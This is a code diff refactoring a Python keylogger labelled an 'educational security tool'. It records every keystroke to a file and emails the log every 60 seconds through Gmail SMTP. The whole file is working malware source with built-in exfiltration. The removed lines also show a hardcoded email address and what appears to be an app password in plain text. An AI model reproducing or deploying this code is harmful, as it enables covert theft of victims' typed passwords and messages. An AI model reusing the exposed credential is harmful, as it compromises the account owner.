@@ -1,71 +1,129 @@
-from pynput import keyboard
-from datetime import datetime
+"""
+===========================================
+KEYLOGGER - EDUCATIONAL SECURITY TOOL
+===========================================
+Author  : Sneha Chhatri
+Purpose : Demonstrates how keyloggers work
+Warning : Use only on your own system!
+===========================================
+"""
+
+import os
 import smtplib
 import threading
-from email.mime.text import MIMEText
+from datetime import datetime
 from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from pynput import keyboard
+from dotenv import load_dotenv
+load_dotenv()
+# ─────────────────────────────────────────
+# CONFIGURATION — credentials from environment
+# ─────────────────────────────────────────
+LOG_FILE = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)),
+    "keylog.txt"
+)
 
-# Log file path
-LOG_FILE = "keylog.txt"
+EMAIL_SENDER   = os.environ.get("EMAIL_ADDRESS", "")
+EMAIL_PASSWORD = os.environ.get("EMAIL_PASSWORD", "")
+EMAIL_RECEIVER = os.environ.get("EMAIL_ADDRESS", "")
+EMAIL_INTERVAL = 60 # seconds
 
-# Email configuration
-EMAIL = "snehachhatri7@gmail.com"
-PASSWORD = "uaiy pkjo oyjk pelf"
-TO_EMAIL = "snehachhatri7@gmail.com"
 
-def on_press(key):
+# ─────────────────────────────────────────
+# HELPER: Write to log file
+# ─────────────────────────────────────────
+def write_log(text: str) -> None:
+    """Append a timestamped entry to the log file."""
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(f"[{timestamp}] {text}\n")
+
+
+# ─────────────────────────────────────────
+# KEYBOARD LISTENERS
+# ─────────────────────────────────────────
+def on_key_press(key) -> None:
+    """Called on every key press — logs character or special key."""
     try:
-        with open(LOG_FILE, "a") as f:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"[{timestamp}] {key.char}\n")
+        write_log(key.char)
     except AttributeError:
-        with open(LOG_FILE, "a") as f:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            f.write(f"[{timestamp}] [{key}]\n")
+        write_log(f"[{key}]")
 
-def on_release(key):
+
+def on_key_release(key) -> bool:
+    """Called on key release — stops listener when ESC pressed."""
     if key == keyboard.Key.esc:
-        print("\n[*] Keylogger stopped.")
+        print("\n[*] ESC detected — keylogger stopped.")
         return False
 
-def send_email():
+
+# ─────────────────────────────────────────
+# EMAIL FEATURE
+# ─────────────────────────────────────────
+def send_email_report() -> None:
+    """Read log file and email contents to receiver."""
     try:
-        with open(LOG_FILE, "r") as f:
+        # Check if credentials are set
+        if not EMAIL_SENDER or not EMAIL_PASSWORD:
+            print("[!] Email credentials not set in environment variables!")
+            return
+
+        with open(LOG_FILE, "r", encoding="utf-8") as f:
             content = f.read()
 
-        if not content:
+        if not content.strip():
+            print("[*] Log file is empty — skipping email.")
             return
 
         msg = MIMEMultipart()
-        msg["From"] = EMAIL
-        msg["To"] = TO_EMAIL
-        msg["Subject"] = "Keylogger Report"
+        msg["From"]    = EMAIL_SENDER
+        msg["To"]      = EMAIL_RECEIVER
+        msg["Subject"] = f"Keylogger Report — {datetime.now().strftime('%Y-%m-%d %H:%M')}"
         msg.attach(MIMEText(content, "plain"))
 
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(EMAIL, PASSWORD)
-        server.send_message(msg)
-        server.quit()
-        print("[*] Email sent successfully!")
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+            server.send_message(msg)
+
+        print("[*] Email report sent successfully!")
+
+    except FileNotFoundError:
+        print("[!] Log file not found — nothing to send.")
     except Exception as e:
         print(f"[!] Email failed: {e}")
 
-def email_timer():
-    send_email()
-    timer = threading.Timer(60, email_timer)
+
+def start_email_timer() -> None:
+    """Send email every EMAIL_INTERVAL seconds in background."""
+    send_email_report()
+    timer = threading.Timer(EMAIL_INTERVAL, start_email_timer)
     timer.daemon = True
     timer.start()
 
-# Main
-print("[*] Keylogger started... Press ESC to stop.")
-print(f"[*] Logging to: {LOG_FILE}")
-print("[*] Email will be sent every 60 seconds\n")
 
-email_timer()
+# ─────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────
+def main() -> None:
+    print("=" * 45)
+    print("  KEYLOGGER — Educational Security Tool")
+    print("=" * 45)
+    print(f"[*] Log file  : {LOG_FILE}")
+    print(f"[*] Email to  : {EMAIL_RECEIVER or 'Not configured'}")
+    print(f"[*] Interval  : Every {EMAIL_INTERVAL} seconds")
+    print("[*] Press ESC to stop\n")
 
-with keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release
-) as listener:
-    listener.join()
+    start_email_timer()
+
+    with keyboard.Listener(
+        on_press=on_key_press,
+        on_release=on_key_release
+    ) as listener:
+        listener.join()
+
+
+if __name__ == "__main__":
+    main()
